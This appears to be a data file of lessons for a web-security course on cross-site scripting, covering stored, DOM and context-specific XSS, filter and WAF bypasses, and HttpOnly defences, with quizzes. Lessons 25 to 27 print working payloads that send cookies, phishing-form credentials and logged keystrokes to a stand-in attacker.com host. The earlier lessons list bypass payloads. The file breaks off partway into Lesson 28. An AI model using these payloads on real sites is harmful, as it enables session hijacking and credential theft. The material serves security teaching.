                {
                  id: 1,
                  question:
                    "Why are administrative users a particularly high-value target for a stored XSS attacker?",
                  options: [
                    "Admins are less likely to notice the attack",
                    "Because an admin's session cookie is highly privileged. Stealing it can give the attacker full control over the application.",
                    "Admins use older browsers",
                    "Admin accounts cannot be secured",
                  ],
                  correct: 1,
                  explanation:
                    "If an attacker can get an admin to view their malicious payload (e.g., by viewing a reported user's profile), they can often escalate their privileges to the highest level.",
                },
              ],
            },
          },
          {
            id: "lesson-11-file-based-stored-xss",
            title: "Lesson 11: File-Based Stored XSS",
            duration: "120 min",
            objectives: [
              "Identify scenarios where user input is stored in files on the server",
              "Exploit XSS by injecting payloads into log files",
              "Understand the risks of applications that modify configuration or template files",
            ],
            content: {
              overview:
                "Databases are not the only place data is stored. This lesson explores how stored XSS can occur when an application insecurely writes user input to a file on the server, such as a log file, which is then later rendered in a web browser.",
              sections: [
                {
                  title: "Log File Injection",
                  content:
                    "<p>A common scenario is an administrative interface that allows an administrator to view the application's raw log files. If the application logs a piece of user input (like a `User-Agent` header) without encoding it first, an attacker can craft a malicious User-Agent containing a script tag. This script is then written into the log file on the server. When the administrator later views this log file in their browser, the script tag is rendered as HTML and executes, compromising the admin's session.</p>",
                  image:
                    "https://images.unsplash.com/photo-1542438408-abb2021e1837?w=800&h=400&fit-crop",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the key vulnerability in the log file injection scenario?",
                  options: [
                    "The application is logging events",
                    "The administrative user has permission to view the logs",
                    "The application insecurely renders the raw contents of the log file in an HTML page without proper output encoding",
                    "The log file is too big",
                  ],
                  correct: 2,
                  explanation:
                    "The vulnerability is not in the logging itself, but in the insecure presentation of that log data to another user. The log viewer must treat all log data as untrusted and encode it properly.",
                },
              ],
            },
          },
          {
            id: "lesson-12-admin-panel-xss",
            title: "Lesson 12: Admin Panel XSS",
            duration: "120 min",
            objectives: [
              "Specifically target administrative interfaces to maximize the impact of stored XSS",
              "Understand how an attacker can use a stored XSS to create a persistent administrative backdoor",
              "Chain an XSS vulnerability with other attacks to abuse administrative functions",
            ],
            content: {
              overview:
                "This lesson focuses on a common attack strategy: using stored XSS to specifically target and compromise high-privilege administrative users. The goal is to escalate from a normal user to a full administrator by having an admin's browser execute your malicious script.",
              sections: [
                {
                  title: "Creating a Backdoor",
                  content:
                    "<p>Once an attacker compromises an administrator's session via stored XSS, they can do more than just steal a cookie. Their script can make authenticated API calls on behalf of the administrator. For example, the payload could be a piece of JavaScript that silently makes an AJAX request in the background to the 'Create New Admin User' API endpoint, using the victim administrator's credentials. The attacker has just used their stored XSS to create a brand new admin account for themselves, giving them a persistent backdoor into the application.</p>",
                  image:
                    "https://images.unsplash.com/photo-1516321497487-e288fb19713f?w=800&h=400&fit-crop",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "A stored XSS payload that makes a silent, background request to `/api/create_admin?user=attacker` is attempting to do what?",
                  options: [
                    "Steal a cookie",
                    "Deface the website",
                    "Abuse the victim administrator's authenticated session to perform an administrative action on the attacker's behalf",
                    "Delete the database",
                  ],
                  correct: 2,
                  explanation:
                    "This is a much more advanced and damaging use of XSS than simple cookie theft, as it directly leverages the compromised session to achieve a specific, high-impact goal.",
                },
              ],
            },
          },
          {
            id: "lesson-13-dom-xss",
            title: "Lesson 13: DOM XSS Fundamentals",
            duration: "120 min",
            objectives: [
              "Understand how DOM-based XSS differs from Stored and Reflected XSS",
              "Use source and sink analysis to trace the flow of data in client-side JavaScript",
              "Identify dangerous JavaScript 'sinks' that can lead to code execution",
            ],
            content: {
              overview:
                "DOM-based XSS is a sophisticated variant where the vulnerability lies entirely within the client-side JavaScript code. The server is not directly involved in reflecting the payload. This lesson covers the fundamentals of this client-side vulnerability, focusing on the 'source-to-sink' data flow.",
              sections: [
                {
                  title: "Source and Sink Analysis",
                  content:
                    "<p>DOM XSS occurs when a 'source' (a piece of user-controllable data in the browser) is read by JavaScript and then passed to a 'sink' (a dangerous JavaScript function that can execute code) without proper sanitization.</p><h3>The Flow:</h3><ol><li><strong>Source:</strong> The attacker finds a user-controllable source, like the URL fragment (<code>location.hash</code>). They craft a malicious URL like <code>http://example.com/page.html#&lt;img src=x onerror=alert(1)&gt;</code>.</li><li><strong>Execution Flow:</strong> A legitimate (but vulnerable) piece of JavaScript on <code>page.html</code> reads the data from the source (<code>location.hash</code>).</li><li><strong>Sink:</strong> The script then passes this untrusted data into a dangerous sink, like the <code>innerHTML</code> property of an element. For example: <code>document.getElementById('greeting').innerHTML = \"Welcome, \" + location.hash;</code>.</li><li><strong>Execution:</strong> The browser parses this updated <code>innerHTML</code> and executes the attacker's payload.</li></ol><p>Critically, the <code>#fragment</code> part of the URL is never even sent to the server, so server-side security controls have no visibility into this attack.</p>",
                  image:
                    "https://images.unsplash.com/photo-1555099962-4199c345e541?w=800&h=400&fit-crop",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "In DOM-based XSS, where does the vulnerability exist?",
                  options: [
                    "In the server-side code",
                    "In the database configuration",
                    "In the client-side JavaScript code",
                    "In the firewall",
                  ],
                  correct: 2,
                  explanation:
                    "The flaw is in how the page's own JavaScript handles user-controllable data that is already present in the browser.",
                },
                {
                  id: 2,
                  question: "In the context of DOM XSS, what is a 'sink'?",
                  options: [
                    "A JavaScript function or property (like `innerHTML`) that can execute script if it is passed untrusted data",
                    "A source of user-controllable data (like `location.hash`)",
                    "A server-side programming language",
                    "A type of cookie",
                  ],
                  correct: 0,
                  explanation:
                    "The sink is the 'end point' of the data flow where the execution happens. The `source` is the 'start point'.",
                },
              ],
            },
          },
          {
            id: "lesson-14-js-source-analysis",
            title: "Lesson 14: JavaScript Source Analysis",
            duration: "120 min",
            objectives: [
              "Identify common DOM XSS sources like `location.search` and `location.hash`",
              "Understand how `window.name` can be used as a cross-domain data store and a source for XSS",
              "Test for insecure handling of `postMessage` events",
            ],
            content: {
              overview:
                "To find DOM XSS, you must be able to read JavaScript and identify the sources of untrusted data. This lesson covers the most common DOM XSS sources that an attacker will look for when analyzing an application's client-side code.",
              sections: [
                {
                  title: "Common Sources",
                  content:
                    "<ul><li><strong>`document.URL`, `document.location`, `location.href`:</strong> The full URL.</li><li><strong>`location.search`:</strong> The query string part of the URL (everything after `?`).</li><li><strong>`location.hash`:</strong> The fragment part of the URL (everything after `#`).</li><li><strong>`document.referrer`:</strong> The URL of the page that linked to the current page.</li><li><strong>`window.name`:</strong> A powerful source because it can be set by a parent page and persists across navigations.</li><li><strong>`postMessage` event data:</strong> The data received in a cross-origin message event.</li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit-crop",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "A piece of JavaScript code that reads from `location.hash` is using what as a data source?",
                  options: [
                    "A cookie",
                    "The part of the URL that comes after the '#' symbol",
                    "The server's response body",
                    "A user's typed input",
                  ],
                  correct: 1,
                  explanation:
                    "The URL fragment (`#...`) is a very common source for DOM-based XSS because it is never sent to the server, making it invisible to many security tools.",
                },
              ],
            },
          },
          {
            id: "lesson-15-dom-sink-exploitation",
            title: "Lesson 15: DOM Sink Exploitation",
            duration: "120 min",
            objectives: [
              "Identify dangerous DOM XSS sinks like `innerHTML` and `document.write`",
              "Exploit sinks that execute strings as code, like `eval()` and `setTimeout()`",
              "Understand how to craft payloads for different sink contexts",
            ],
            content: {
              overview:
                "The final piece of the DOM XSS puzzle is the sink. This lesson covers the most common and dangerous JavaScript functions and properties that can lead to DOM XSS if they are ever called with untrusted data from a source.",
              sections: [
                {
                  title: "Dangerous Sinks",
                  content:
                    "<ul><li><strong>`element.innerHTML`:</strong> The most common sink. It parses and renders the given string as HTML.</li><li><strong>`document.write()`:</strong> Writes a string of text directly to the document stream.</li><li><strong>`eval()`:</strong> The 'evil' sink. It takes a string and executes it directly as JavaScript code. This should almost never be used.</li><li><strong>`setTimeout()`, `setInterval()`:</strong> These functions can take a string as their first argument, which will be evaluated and executed as code.</li><li><strong>`location.href` (as a sink):</strong> If an attacker can control the value passed to `location.href`, they can inject a `javascript:` URL to execute code. E.g., `location.href = \"javascript:alert(1)\"`.</li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1555099962-4199c345e541?w=800&h=400&fit-crop",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "Why is the `innerHTML` property of an HTML element considered a dangerous sink?",
                  options: [
                    "It can only contain text",
                    "It can change the color of the element",
                    "Because the browser will parse and execute any script tags or event handlers in the string that is assigned to it",
                    "It is very slow",
                  ],
                  correct: 2,
                  explanation:
                    "Assigning raw HTML to `innerHTML` is the primary way that DOM XSS vulnerabilities are created. Data should be assigned using safer properties like `textContent` which do not parse HTML.",
                },
              ],
            },
          },
          {
            id: "lesson-16-modern-framework-dom-xss",
            title: "Lesson 16: Modern Framework DOM XSS",
            duration: "120 min",
            objectives: [
              "Identify how React's `dangerouslySetInnerHTML` can introduce XSS",
              "Find Angular template injection vulnerabilities that lead to XSS",
              "Understand XSS risks in jQuery and other older libraries",
            ],
            content: {
              overview:
                "While modern JavaScript frameworks provide strong default protection against XSS, developers have ways to bypass these protections. This lesson covers how to find DOM XSS vulnerabilities in applications built with popular frameworks like React and Angular.",
              sections: [
                {
                  title: "Framework-Specific Bypasses",
                  content:
                    "<p>Frameworks like React and Angular are 'aware' of XSS and will automatically encode and sanitize data to prevent it. Vulnerabilities usually arise when a developer *explicitly* bypasses these built-in security controls. A security code review for these applications is often a process of searching for the use of these known-dangerous functions and verifying that their use is safe.</p>",
                  image:
                    "https://images.unsplash.com/photo-1633356122102-3fe601e05bd2?w=800&h=400&fit-crop",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "True or False: Using a modern framework like React or Angular makes your application completely immune to XSS.",
                  options: ["True", "False"],
                  correct: 1,
                  explanation:
                    "False. While these frameworks provide excellent protection *by default*, developers can and do introduce vulnerabilities by deliberately using unsafe functions to bypass those protections. The framework helps, but it is not a silver bullet.",
                },
              ],
            },
          },
          {
            id: "lesson-17-filter-bypass-techniques",
            title: "Lesson 17: Filter Bypass Techniques",
            duration: "120 min",
            objectives: [
              "Evade simple XSS filters using HTML entity encoding",
              "Use JavaScript obfuscation to hide payloads from signature-based filters",
              "Manipulate character sets and null bytes to break sanitization routines",
            ],
            content: {
              overview:
                "Many developers try to defend against XSS by using a deny-list (blacklist) to filter out 'bad' keywords like `<script>` or `onerror`. This lesson is a masterclass in why this approach is fundamentally flawed, covering the dozens of ways an attacker can bypass these naive filters.",
              sections: [
                {
                  title: "Bypassing Deny-Lists",
                  content:
                    "<p>A filter might be looking for the exact string `<script>`. An attacker has countless ways to get around this.</p><h3>Bypass Examples:</h3><ul><li><strong>Case Variation:</strong> `<sCrIpT>`.</li><li><strong>Null Bytes:</strong> `<scr%00ipt>`.</li><li><strong>Nested Tags:</strong> `<s<script>cript>`.</li><li><strong>Encoding:</strong> Using HTML entity (`&#x3c;script&#x3e;`) or URL encoding (`%3cscript%3e`).</li><li><strong>Using a Different Tag/Event:</strong> A filter that only blocks `<script>` is useless against a payload like `<svg onload=alert(1)>`.</li></ul><p>This is why an allow-list for input validation and context-aware output encoding (the correct fixes) are so important. It's impossible to create a perfect deny-list.</p>",
                  image:
                    "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit=crop",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "Why is a deny-list (blacklist) approach to preventing XSS almost always doomed to fail?",
                  options: [
                    "It is too secure",
                    "Because there are hundreds of different ways to encode and represent an XSS payload, making it nearly impossible to create a filter that can anticipate them all",
                    "It makes the website too slow",
                    "It blocks all users",
                  ],
                  correct: 1,
                  explanation:
                    "The creativity of attackers in finding new bypass techniques will always outpace the ability of a developer to create a perfect blacklist. This is why OWASP recommends against this approach.",
                },
              ],
            },
          },
          {
            id: "lesson-18-waf-bypass-methods",
            title: "Lesson 18: WAF Bypass Methods",
            duration: "120 min",
            objectives: [
              "Understand how WAFs use regular expressions to detect XSS payloads",
              "Use alternative event handlers and attributes to evade common signatures",
              "Leverage protocol-relative URLs and other tricks to bypass WAF rules",
            ],
            content: {
              overview:
                "Web Application Firewalls (WAFs) are a common defense-in-depth control. This lesson covers the techniques that attackers use to craft their XSS payloads in a way that is still valid for the browser but does not match the known-bad signatures used by the WAF.",
              sections: [
                {
                  title: "Bypassing with Obscure Syntax",
                  content:
                    "<p>WAFs often have signatures for common event handlers like `onload` or `onerror`. However, there are hundreds of possible event handlers in modern browsers. An attacker might use a much more obscure one that is not in the WAF's signature set, like `onbegin` (for SVG elements) or `onanimationend`. The browser will still execute it, but the WAF may not see it as malicious.</p>",
                  image:
                    "https://images.unsplash.com/photo-1605379399642-870262d3d051?w=800&h=400&fit=crop",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "A WAF's XSS protection is primarily based on what?",
                  options: [
                    "Understanding the application's business logic",
                    "Encrypting user data",
                    "Using a set of regular expressions (signatures) to look for known-bad XSS patterns",
                    "A machine learning algorithm",
                  ],
                  correct: 2,
                  explanation:
                    "Most traditional WAFs rely on signature-based detection. Bypassing a WAF is the art of crafting a payload that is semantically malicious but syntactically does not match the WAF's signatures.",
                },
              ],
            },
          },
          {
            id: "lesson-19-xss-polyglots",
            title: "Lesson 19: XSS Polyglots",
            duration: "120 min",
            objectives: [
              "Understand how a polyglot payload is designed to execute in multiple contexts simultaneously",
              "Develop universal XSS vectors that can work in HTML, script, and attribute contexts",
              "Use polyglots for efficient, automated scanning",
            ],
            content: {
              overview:
                "An XSS polyglot is a masterfully crafted piece of code that is a valid XSS payload in multiple different output contexts at the same time. This lesson deconstructs these clever payloads and shows how they are used by scanners to find vulnerabilities with a single request.",
              sections: [
                {
                  title: "The Polyglot Payload",
                  content:
                    "<p>A simple polyglot payload might look like this: <code>--&gt;'&gt;&lt;/script&gt;&lt;svg onload=alert(1)&gt;</code>. Let's break down why this is so effective:</p><ul><li>It starts with <code>--&gt;</code> which will close an HTML comment if the injection point is inside one.</li><li>Then <code>'&gt;</code> which can break out of an attribute context.</li><li>Then <code>&lt;/script&gt;</code> which will close a script block.</li><li>Then the final, reliable payload <code>&lt;svg onload=alert(1)&gt;</code> which is likely to execute in a standard HTML context.</li></ul><p>By chaining these together, the attacker creates a single string that has a high chance of working, regardless of the output context, without needing to know what it is in advance.</p>",
                  image:
                    "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit-crop",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the primary purpose of an XSS polyglot payload?",
                  options: [
                    "To steal a specific user's cookie",
                    "To be a single, universal payload that has a high probability of executing successfully in many different output contexts",
                    "To only work in a JavaScript context",
                    "To deface a website",
                  ],
                  correct: 1,
                  explanation:
                    "Polyglots are used for efficient blind testing and scanning, as they allow a tester to use a single payload to test for vulnerabilities in many different contexts at once.",
                },
              ],
            },
          },
          {
            id: "lesson-20-browser-exploitation",
            title: "Lesson 20: Browser-Specific Exploitation",
            duration: "120 min",
            objectives: [
              "Understand how differences in browser rendering engines and JavaScript interpreters can be abused",
              "Exploit browser quirks and non-standard features",
              "Craft payloads that specifically target older, less secure browsers like Internet Explorer",
            ],
            content: {
              overview:
                "While modern browsers are becoming more standardized, they still have their own quirks and proprietary features. This lesson explores how attackers can leverage these differences to find bypasses or exploits that only work on a specific browser or version.",
              sections: [
                {
                  title: "Exploiting Browser Quirks",
                  content:
                    "<p>Different browsers might parse malformed HTML in slightly different ways. This can sometimes be abused to bypass a security filter. A server-side filter might be based on how it thinks Chrome will render a page, but Firefox might render the same broken HTML in a way that allows a script to execute. This is a complex area of XSS, often called 'Mutation XSS' (mXSS), that we will cover in a later lesson.</p>",
                  image:
                    "https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800&h=400&fit-crop",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "Why would an attacker research browser-specific XSS techniques?",
                  options: [
                    "To find payloads that work on all browsers equally",
                    "To find a bypass that works against a specific browser version that might be used by a target organization",
                    "To help the browser vendors fix bugs",
                    "Because it is the easiest form of XSS",
                  ],
                  correct: 1,
                  explanation:
                    "Targeted attacks often involve exploiting vulnerabilities specific to the software stack used by the target, and that includes their standard corporate web browser.",
                },
              ],
            },
          },
          {
            id: "lesson-21-html-context-xss",
            title: "Lesson 21: HTML Context XSS",
            duration: "120 min",
            objectives: [
              "Master the art of payload crafting for injection inside standard HTML tags",
              "Use a wide variety of tags and event handlers to execute payloads",
              "Leverage modern HTML5 features and tags (like `<svg>` and `<details>`) for XSS",
            ],
            content: {
              overview:
                "This lesson is a deep dive into the most common XSS scenario: when your input is reflected inside the main HTML body. We will move beyond `<script>` to explore the hundreds of tags and event handlers that can be used to execute JavaScript.",
              sections: [
                {
                  title: "The Attacker's HTML Cheat Sheet",
                  content:
                    '<p>A filter that blocks `<script>` is a minor inconvenience. An attacker has a huge arsenal of alternatives:</p><ul><li>`<svg onload=alert(1)>`</li><li>`<img src=x onerror=alert(1)>`</li><li>`<body onpageshow=alert(1)>`</li><li>`<details open ontoggle=alert(1)>`</li><li>`<iframe src="javascript:alert(1)">`</li><li>`<a href="" onclick="alert(1)">Click me</a>`</li></ul><p>The list is almost endless. A deep knowledge of HTML and the DOM is a key skill for any advanced web penetration tester.</p>',
                  image:
                    "https://images.unsplash.com/photo-1517694712202-14261e80e3a5?w=800&h=400&fit-crop",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the purpose of the `<svg onload=alert(1)>` payload?",
                  options: [
                    "To display a vector graphic",
                    "To execute JavaScript via the `onload` event handler when the SVG element is parsed and loaded by the browser",
                    "To perform an SQL injection",
                    "To crash the server",
                  ],
                  correct: 1,
                  explanation:
                    "Modern HTML5 introduced new elements like SVG that also have event handlers, expanding the attack surface for XSS significantly.",
                },
              ],
            },
          },
          {
            id: "lesson-22-js-context-xss",
            title: "Lesson 22: JavaScript Context XSS",
            duration: "120 min",
            objectives: [
              "Identify when user input is reflected inside a JavaScript string",
              "Craft payloads to escape the string context and inject executable code",
              "Exploit template literal injection vulnerabilities in modern JavaScript",
            ],
            content: {
              overview:
                "When user input is placed inside a `<script>` block, the rules change. A simple `<script>` tag payload won't work. This lesson covers how to craft payloads to escape from a JavaScript string literal and achieve code execution.",
              sections: [
                {
                  title: "Breaking Out of the String",
                  content:
                    "<p>Imagine a page with this vulnerable code: <code>&lt;script&gt;var username = 'USER_INPUT';&lt;/script&gt;</code>. An attacker needs to escape the single quotes.</p><h3>The Escape Payload:</h3><p>An attacker could submit the payload <code>';alert(1)//</code>. When this is placed in the code, it becomes:</p><p><code>&lt;script&gt;var username = '';alert(1)//';&lt;/script&gt;</code></p><p>This is now valid JavaScript. The first `'` closes the string variable. The `;` ends the statement. The <code>alert(1)</code> is now executable code. And the `//` is a JavaScript comment that helpfully comments out the trailing `'` from the original code, preventing a syntax error. This is the classic technique for JavaScript context XSS.</p>",
                  image:
                    "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit=crop",
                },
              ],
            },
            questions: [
              {
                id: 1,
                question:
                  'If your input is reflected into the code `var name = "YOUR_INPUT";`, what would be a valid XSS payload?',
                options: [
                  "&lt;script&gt;alert(1)&lt;/script&gt;",
                  "\\onerror=alert(1)",
                  '";alert(1)//',
                  "' OR '1'='1",
                ],
                correct: 2,
                explanation:
                  'The payload \\";alert(1)// is crafted to first close the string context (\\"), then execute code (alert(1)), and finally comment out the rest of the original line (//) to prevent syntax errors.',
              },
            ],
          },
          {
            id: "lesson-23-css-context-xss",
            title: "Lesson 23: CSS Context XSS",
            duration: "120 min",
            objectives: [
              "Understand how user-controlled data can be reflected into a CSS context",
              "Exploit older, browser-specific CSS features like `expression()` for code execution",
              "Use modern CSS injection techniques to exfiltrate data",
            ],
            content: {
              overview:
                "While less common, it is sometimes possible to achieve Cross-Site Scripting by injecting code into a CSS context, such as an inline style attribute. This lesson covers these niche but clever attack vectors.",
              sections: [
                {
                  title: "CSS Injection",
                  content:
                    "<p>The classic CSS attack used the `expression()` property, which was a feature in old versions of Internet Explorer that allowed JavaScript to be executed within CSS. For example: `width: expression(alert(1));`.</p><p>While this is no longer supported, modern techniques focus on data exfiltration. An attacker who can inject arbitrary CSS can use attribute selectors to change the page's appearance based on the content of other elements, including sensitive data like an anti-CSRF token. They can then use a background image URL to send that character to their server, one character at a time. This is a complex but powerful attack.</p>",
                  image:
                    "https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800&h=400&fit-crop",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "Are CSS-based XSS and data exfiltration attacks common in modern browsers?",
                  options: [
                    "Yes, they are the most common XSS type",
                    "No, most direct code execution vectors in CSS have been deprecated, but some advanced data exfiltration techniques still exist",
                  ],
                  correct: 1,
                  explanation:
                    "Direct script execution via CSS is largely a historical vulnerability, but it highlights the importance of correctly encoding user data in *all* contexts, including style attributes.",
                },
              ],
            },
          },
          {
            id: "lesson-24-url-context-xss",
            title: "Lesson 24: URL Context XSS",
            duration: "120 min",
            objectives: [
              "Identify XSS vulnerabilities when user input is placed in an `href` or `src` attribute",
              "Exploit these using the `javascript:` pseudo-protocol",
              "Understand how to use data URIs for XSS payloads",
            ],
            content: {
              overview:
                "When user input is reflected inside a URL-based attribute, like the `href` of an anchor tag, it creates a unique context for XSS. This lesson covers how to exploit this context using special URI schemes.",
              sections: [
                {
                  title: "The `javascript:` Pseudo-Protocol",
                  content:
                    '<p>Most browsers will treat a URL that starts with `javascript:` as code to be executed. If an attacker can control the beginning of the value in an `href` attribute, they can use this scheme.</p><h3>Vulnerable Code:</h3><p>`<a href="USER_INPUT">Click me</a>`</p><h3>Payload:</h3><p>`javascript:alert(1)`</p><p>When a user clicks the resulting link, the browser will execute the JavaScript instead of navigating to a URL.</p>',
                  image:
                    "https://images.unsplash.com/photo-1517694712202-14261e80e3a5?w=800&h=400&fit=crop",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "An attacker injects the payload `javascript:alert(document.cookie)` into the `href` attribute of an anchor tag (`<a>`). When will this payload execute?",
                  options: [
                    "When the page loads",
                    "When the user clicks the link",
                    "It will not execute",
                    "When the server reboots",
                  ],
                  correct: 1,
                  explanation:
                    "The `javascript:` URI scheme is only executed when the link is followed, which typically requires user interaction like a click.",
                },
              ],
            },
          },
          {
            id: "lesson-25-session-hijacking",
            title: "Lesson 25: XSS Exploitation - Session Hijacking",
            duration: "120 min",
            objectives: [
              "Master the primary goal of XSS: stealing session cookies",
              "Write a cookie-stealing payload and a listener to receive the stolen data",
              "Use stolen session tokens to impersonate a victim",
              "Understand defenses like the HttpOnly cookie flag",
            ],
            content: {
              overview:
                "This lesson is dedicated to the number one goal of most XSS attacks: session hijacking. You will learn the complete, end-to-end process of crafting a payload to steal a user's session cookie, setting up a server to receive it, and then using that stolen cookie to completely take over their account.",
              sections: [
                {
                  title: "The Cookie Theft Payload",
                  content:
                    "<p>The standard payload is a piece of JavaScript that reads the <code>document.cookie</code> variable and sends it to a server controlled by the attacker. A simple way to do this is to redirect the user's browser to the attacker's server, with the cookie appended as a URL parameter.</p><p><code>&lt;script&gt;document.location='http://attacker.com/cookie_collector.php?cookie='+document.cookie;&lt;/script&gt;</code></p>",
                  image:
                    "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit=crop",
                },
                {
                  title: "Using the Stolen Cookie",
                  content:
                    "<p>Once the attacker has the victim's session cookie, they can use a proxy tool or a browser extension to set that cookie in their own browser. When they then visit the vulnerable application, the server will see the valid session cookie and will believe the attacker is the victim, giving them full access to the victim's account.</p>",
                  image:
                    "https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=800&h=400&fit=crop",
                },
                {
                  title: "The `HttpOnly` Defense",
                  content:
                    "<p>The primary defense against this attack is for the server to set the `HttpOnly` flag on the session cookie. This is a special attribute that tells the browser that this cookie should *never* be accessible to client-side JavaScript. If the `HttpOnly` flag is set, `document.cookie` will not include the session token, and this attack is completely mitigated.</p>",
                  image:
                    "https://images.unsplash.com/photo-1599373922312-5b9340d8a5a5?w=800&h=400&fit-crop",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the primary purpose of setting the `HttpOnly` flag on a session cookie?",
                  options: [
                    "To make the cookie expire faster",
                    "To make the cookie inaccessible to JavaScript, thus preventing it from being stolen via an XSS attack",
                    "To ensure the cookie is only sent over HTTPS",
                    "To make the cookie smaller",
                  ],
                  correct: 1,
                  explanation:
                    "The HttpOnly flag is a critical defense-in-depth control. It breaks the most common XSS attack chain by denying the attacker's script access to the session token.",
            },
              ],
            },
          },
                 {
                "id": "lesson-26-phishing-social-engineering",
                "title": "Lesson 26: XSS Exploitation - Phishing and Social Engineering",
                "duration": "120 min",
                "objectives": [
                    "Use XSS to inject a fake login form onto a trusted website for credential harvesting",
                    "Manipulate the DOM to create convincing content spoofs and phishing lures",
                    "Understand how to chain XSS with social engineering to enhance attacks"
                ],
                "content": {
                    "overview": "XSS can be used for far more than just stealing cookies. An attacker can leverage an XSS vulnerability to completely rewrite a trusted page, turning it into a perfect phishing platform. This lesson covers how to use XSS to harvest credentials and perform advanced social engineering.",
                    "sections": [
                        {
                            "title": "Injecting Fake Login Forms",
                            "content": "<p>A powerful exploitation technique is to use DOM manipulation to inject a fake login form. The attacker's script can hide the legitimate page content and display a form that looks identical to the real login page, perhaps with a message like 'Your session has expired. Please log in again to continue'.</p><p>When the victim enters their username and password into this form, the attacker's script captures the credentials and sends them to the attacker's server via an AJAX request in the background. The script might then redirect the user back to the real login page, making them think it was just a glitch. The attacker now has the user's plaintext password.</p>",
                            "image": "https://images.unsplash.com/photo-1548092372-6a7e3206a5a2?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Payload to Inject a Phishing Form",
                        "language": "javascript",
                        "code": "// A simplified version of the malicious JavaScript payload.\n\n// Create a form element\nvar form = document.createElement('form');\nform.action = 'http://attacker.com/collector'; // Send creds to attacker\nform.method = 'POST';\n\n// Add input fields for username and password\nform.innerHTML = '<h2>Session Expired</h2><p>Please log in again.</p>' +\n                 'Username: <input type=\"text\" name=\"username\"><br>' +\n                 'Password: <input type=\"password\" name=\"password\"><br>' +\n                 '<input type=\"submit\" value=\"Log In\">';\n\n// Replace the entire page body with the fake form\ndocument.body.innerHTML = '';\ndocument.body.appendChild(form);"
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "Why is an XSS-based phishing attack more effective than a traditional phishing email?", "options": ["It is easier to create", "Because the fake login form is on the real, trusted domain (the URL in the browser bar is correct), making it almost impossible for a user to detect that it's a fake", "It can steal cookies", "It only affects administrators"], "correct": 1, "explanation": "This is the key danger. The user is on the legitimate website, with a valid HTTPS certificate. All the visual cues of trust are present, making the injected phishing form incredibly convincing." }
                    ]
                }
            },
            {
                "id": "lesson-27-keylogging-form-hijacking",
                "title": "Lesson 27: XSS Exploitation - Keylogging and Form Hijacking",
                "duration": "120 min",
                "objectives": [
                    "Implement a JavaScript keylogger to capture all user keystrokes",
                    "Hijack legitimate form submissions to silently exfiltrate data",
                    "Monitor input fields in real time to steal sensitive information as it's typed"
                ],
                "content": {
                    "overview": "This lesson explores even more insidious XSS payloads. You will learn how to inject scripts that passively monitor all of the user's activity on a page, capturing every keystroke and intercepting sensitive form data before it's even submitted to the server.",
                    "sections": [
                        {
                            "title": "JavaScript Keylogger",
                            "content": "<p>An attacker can inject a script that adds an event listener to the entire document. This listener will fire on every single `keypress` event.</p><p>The script can then capture the character typed and append it to a string. Periodically (e.g., every 10 seconds), the script can send the captured keystrokes to the attacker's server. This allows an attacker to silently record everything a user types on the vulnerable page, including private messages, passwords, and credit card numbers.</p>",
                            "image": "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Basic JavaScript Keylogger Payload",
                        "language": "javascript",
                        "code": "var keys = '';\ndocument.onkeypress = function(e) {\n    keys += e.key;\n}\n\n// Send the captured keys to the attacker every 5 seconds\nsetInterval(function() {\n    if (keys.length > 0) {\n        new Image().src = 'http://attacker.com/log?keys=' + keys;\n        keys = '';\n    }\n}, 5000);"
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "A JavaScript keylogger injected via XSS can capture what?", "options": ["Only the user's password", "Only data from forms", "Every keystroke the user types anywhere on the compromised page", "Only the user's cookie"], "correct": 2, "explanation": "The keylogger provides a comprehensive way to capture all user input, making it a very powerful and dangerous exploitation technique." }
                    ]
                }
            },
            {
                "id": "lesson-28-browser-exploitation",
                "title": "Lesson 28: Browser Exploitation",
                "duration": "120 min",
                "objectives": [
                    "Understand how XSS can be a launchpad for more serious browser attacks",
                    "Explore the Browser Exploitation Framework (BeEF) and its capabilities",
                    "Chain an XSS vulnerability with a browser exploit to compromise the user's machine"
                ],
                "content": {
                    "overview": "XSS can be the first step in a much more complex attack chain. This lesson introduces the Browser Exploitation Framework (BeEF), a powerful tool that uses an XSS vulnerability as a beachhead to take control of the victim's browser and launch further attacks.",
                    "sections": [
                       {
